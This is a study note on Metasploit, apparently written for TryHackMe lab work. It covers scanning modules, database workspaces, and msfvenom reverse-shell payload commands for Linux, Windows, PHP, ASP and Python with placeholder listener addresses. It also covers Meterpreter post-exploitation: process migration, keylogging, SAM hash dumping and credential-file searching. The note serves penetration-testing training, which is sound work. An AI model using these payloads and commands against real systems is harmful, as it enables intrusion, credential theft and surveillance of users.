# Metasploit

### **Port Scanning**

Metasploit has a number of modules to scan open ports on the target system and network. You can list potential port scanning modules available using the `search portscan` command.

### **UDP service Identification**

The `scanner/discovery/udp_sweep` module will allow you to quickly identify services running over the UDP (User Datagram Protocol). As you can see below, this module will not conduct an extensive scan of all possible UDP services but does provide a quick way to identify services such as DNS or NetBIOS.

### **SMB Scans**

Metasploit offers several useful auxiliary modules that allow us to scan specific services. Below is an example for the SMB. Especially useful in a corporate network would be `smb_enumshares` and `smb_version` but please spend some time to identify scanners that the Metasploit version installed on your system offers.

### Metasploit Database

You will first need to start the PostgreSQL database, which Metasploit will use with the following command: 

`systemctl start postgresql`

Then you will need to initialize the Metasploit Database using the `msfdb init` command.

You can now launch `msfconsole` and check the database status using the `db_status` command.

The database feature will allow you to create workspaces to isolate different projects. When first launched, you should be in the default workspace. You can list available workspaces using the `workspace` command.

You can add a workspace using the `-a` parameter or delete a workspace using the `-d` parameter, respectively. The screenshot below shows that a new workspace named "tryhackme" was created.

You will also notice that the new database name is printed in red, starting with a `*` symbol.

You can use the workspace command to navigate between workspaces simply by typing `workspace` followed by the desired workspace name.

You can use the `workspace -h` command to list available options for the `workspace` command.

Different from regular Metasploit usage, once Metasploit is launched with a database, the `help` command, you will show the Database Backends Commands menu.

```shell
Database Backend Commands 
=========================  
Command           Description 
-------           ----------- 
analyze           Analyze database information about a specific address or       address range 
db_connect        Connect to an existing data service 
db_disconnect     Disconnect from the current data service 
db_export         Export a file containing the contents of the database db_import         Import a scan result file (filetype will be auto-detected) db_nmap           Executes nmap and records the output automatically db_rebuild_cache  Rebuilds the database-stored module cache (deprecated) db_remove         Remove the saved data service entry 
db_save           Save the current data service connection as the default to reconnect on startup 
db_status         Show the current data service status 
hosts             List all hosts in the database 
loot              List all loot in the database 
notes             List all notes in the database 
services          List all services in the database 
vulns             List all vulnerabilities in the database workspace         Switch between database workspaces
```

If you run a Nmap scan using the `db_nmap` all results will be saved to the database.

You can now reach information relevant to hosts and services running on target systems with the `hosts` and `services` commands, respectively.

## Msfvenom

### **Output formats**

You can either generate stand-alone payloads (e.g. a Windows executable for Meterpreter) or get a usable raw format (e.g. python). The `msfvenom --list formats` command can be used to list supported output formats

### **Other Payloads**

Linux Executable and Linkable Format (elf)  
`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf`  
The .elf format is comparable to the .exe format in Windows. These are executable files for Linux. However, you may still need to make sure they have executable permissions on the target machine. For example, once you have the shell.elf file on your target machine, use the chmod +x shell.elf command to accord executable permissions. Once done, you can run this file by typing ./shell.elf on the target machine command line.  
  
Windows  
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe`  
  
PHP  
`msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php`  
  
ASP  
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp`  
  
Python  
`msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py`

### **Meterpreter commands**

The `getuid` command will display the user with which Meterpreter is currently running. This will give you an idea of your possible privilege level on the target system (e.g. Are you an admin level user like NT AUTHORITY\SYSTEM or a regular user?)

The `ps` command will list running processes. The PID column will also give you the PID information you will need to migrate Meterpreter to another process.

### **Migrate**

Migrating to another process will help Meterpreter interact with it. For example, if you see a word processor running on the target (e.g. word.exe, notepad.exe, etc.), you can migrate to it and start capturing keystrokes sent by the user to this process. Some Meterpreter versions will offer you the `keyscan_start`, `keyscan_stop`, and `keyscan_dump` command options to make Meterpreter act like a keylogger. Migrating to another process may also help you to have a more stable Meterpreter session.

To migrate to any process, you need to type the migrate command followed by the PID of the desired target process. The example below shows Meterpreter migrating to process ID 716.

### **Hashdump**

The `hashdump` command will list the content of the SAM database. The SAM (Security Account Manager) database stores user's passwords on Windows systems. These passwords are stored in the NTLM (New Technology LAN Manager) format.

### **Search**

The `search` command is useful to locate files with potentially juicy information. In a CTF context, this can be used to quickly find a flag or proof file, while in actual penetration testing engagements, you may need to search for user-generated files or configuration files that may contain password or account information

### **Shell**

The shell command will launch a regular command-line shell on the target system. Pressing CTRL+Z will help you go back to the Meterpreter shell.




#tools #metasploit